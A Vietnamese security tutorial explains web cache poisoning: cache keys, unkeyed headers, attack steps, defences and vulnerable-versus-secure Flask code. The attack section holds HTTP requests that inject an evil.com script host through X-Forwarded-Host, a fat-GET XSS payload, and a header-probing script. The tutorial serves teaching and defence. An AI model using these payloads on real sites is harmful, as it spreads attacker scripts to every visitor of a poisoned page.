# Web Cache Poisoning

> **OWASP Top 10:2025**: A08 | **CWE**: CWE-349 | **Nguồn**: PortSwigger, James Kettle Research

## 🧱 Kiến thức Nền tảng

**Web cache** là một lớp trung gian lưu trữ bản sao của HTTP response để phục vụ nhanh hơn cho các request giống nhau tiếp theo. Cache có thể nằm ở nhiều vị trí: CDN (Cloudflare, Akamai), reverse proxy (Varnish, Nginx), hoặc application-level cache.

Khi nhận một request, cache server tạo **cache key** — thường gồm `Method + Host + Path + Query String` — để xác định xem response đã được lưu chưa. Các thành phần **không nằm trong cache key** được gọi là **unkeyed inputs** (ví dụ: headers như `X-Forwarded-Host`, `X-Original-URL`, `Accept-Language`).

Điểm quan trọng: mặc dù unkeyed inputs không ảnh hưởng đến cache key, chúng vẫn có thể ảnh hưởng đến nội dung response. Đây chính là nền tảng của Web Cache Poisoning.

```
# Normal cache operation flow
Client A ─→ GET /home ─→ [Cache: MISS] ─→ [Origin Server] ─→ Response (cached)
Client B ─→ GET /home ─→ [Cache: HIT]  ─→ Cached Response (served directly)

# Cache key typically includes:
# Key = METHOD + HOST + PATH + QUERY_STRING
# Unkeyed = Headers (X-Forwarded-Host, Cookie, User-Agent, etc.)
```

```python
# Simplified cache logic (pseudocode)
def handle_request(request):
    # Build cache key from specific request components
    cache_key = f"{request.method}|{request.host}|{request.path}|{request.query}"
    
    cached = cache.get(cache_key)
    if cached:
        return cached  # Cache HIT — return stored response
    
    # Cache MISS — forward to origin
    response = origin_server.forward(request)  # Unkeyed headers still affect this!
    
    if response.is_cacheable():
        cache.store(cache_key, response)  # Store response for future requests
    
    return response
```

## 🔍 Mô tả lỗ hổng

Web Cache Poisoning xảy ra khi kẻ tấn công thao túng **unkeyed input** (header, cookie không nằm trong cache key) để khiến origin server trả về response chứa payload độc hại. Response này sau đó được cache lưu trữ và **phục vụ cho tất cả người dùng** truy cập cùng URL.

Khác với các cuộc tấn công truyền thống chỉ ảnh hưởng đến một người dùng, cache poisoning có tác động **lan rộng** — mọi visitor đều nhận được response bị nhiễm độc cho đến khi cache hết hạn.

## ⚔️ Cơ chế tấn công

**Bước 1: Tìm unkeyed header ảnh hưởng đến response:**

```http
# Probe with X-Forwarded-Host header — check if it reflects in response
GET /home HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

# If the response contains:
# <script src="https://attacker.com/resources/main.js"></script>
# Then X-Forwarded-Host is reflected but NOT part of cache key!
```

**Bước 2: Gửi request độc hại để poison cache:**

```http
# Poison the cache — inject malicious host into cached response
GET /home HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: evil.com/exploit

# Response (gets cached with key "GET|vulnerable.com|/home"):
# HTTP/1.1 200 OK
# <link rel="canonical" href="https://evil.com/exploit/home"/>
# <script src="https://evil.com/exploit/static/app.js"></script>
```

**Bước 3: Mọi user truy cập /home đều bị ảnh hưởng:**

```http
# Innocent user visits the same URL — receives the poisoned cached response
GET /home HTTP/1.1
Host: vulnerable.com

# Response (from cache — contains attacker's payload):
# <script src="https://evil.com/exploit/static/app.js"></script>
# ^^^ Attacker's JavaScript executes in every visitor's browser!
```

**Kỹ thuật nâng cao — Fat GET với unkeyed body:**

```http
# Some frameworks process body in GET requests — body is unkeyed
GET /api/translations?lang=en HTTP/1.1
Host: vulnerable.com
Content-Length: 58

{"locales":"en","default_locale":"en<script>alert(1)</script>"}

# If the body influences the response but isn't in the cache key,
# the XSS payload gets cached and served to all users
```

**Công cụ tự động phát hiện — Param Miner:**

```python
# Automated unkeyed header discovery script
import requests

UNKEYED_HEADERS = [
    'X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Original-URL',
    'X-Rewrite-URL', 'X-Forwarded-Proto', 'X-Host',
    'X-Forwarded-Server', 'Forwarded', 'CF-Connecting-IP'
]

def probe_unkeyed_headers(target_url):
    """Test each header to find those reflected in the response"""
    baseline = requests.get(target_url).text

    for header in UNKEYED_HEADERS:
        canary = f"cachepoisontest123.com"  # Unique canary value
        response = requests.get(target_url, headers={header: canary})

        if canary in response.text and canary not in baseline:
            print(f"[REFLECTED] {header} → unkeyed and reflected in response!")
        else:
            print(f"[SAFE] {header} — not reflected")

probe_unkeyed_headers("https://target.com/")
```

## 🛡️ Biện pháp phòng thủ

1. **Đưa tất cả input ảnh hưởng response vào cache key** — dùng `Vary` header:

```http
# Include relevant headers in cache key via Vary header
HTTP/1.1 200 OK
Vary: X-Forwarded-Host, Accept-Language, Accept-Encoding
Cache-Control: public, max-age=3600
```

2. **Loại bỏ unkeyed header không cần thiết** tại tầng proxy trước khi forward:

```nginx
# Nginx — strip dangerous headers before forwarding to origin
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";
```

3. **Không phản ánh header vào response** — tránh dùng header value trong HTML output.

4. **Sử dụng `Cache-Control: private`** cho trang chứa user-specific content.

5. **Giám sát cache hit rate** — tỷ lệ cache hit bất thường có thể là dấu hiệu poisoning.

## 💻 Code Example

```python
# === VULNERABLE: Reflects X-Forwarded-Host into page without cache key ===
from flask import Flask, request

app = Flask(__name__)

@app.route('/home')
def home():
    # X-Forwarded-Host is used to build asset URLs but NOT in cache key
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.example.com')
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # DANGEROUS: attacker controls cdn_host via unkeyed header

# === SECURE: Whitelist allowed hosts, ignore unknown forwarded headers ===
ALLOWED_CDN_HOSTS = {'cdn.example.com', 'static.example.com'}

@app.route('/home-secure')
def home_secure():
    cdn_host = request.headers.get('X-Forwarded-Host', 'cdn.example.com')
    if cdn_host not in ALLOWED_CDN_HOSTS:
        cdn_host = 'cdn.example.com'  # Fallback to safe default
    return f'''
    <html>
    <head><script src="https://{cdn_host}/assets/app.js"></script></head>
    <body>Welcome!</body>
    </html>
    '''  # SAFE: only whitelisted CDN hosts are used
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/web-cache-poisoning
- OWASP: https://owasp.org/www-community/attacks/Cache_Poisoning
- CWE: https://cwe.mitre.org/data/definitions/349.html
- James Kettle: https://portswigger.net/research/practical-web-cache-poisoning
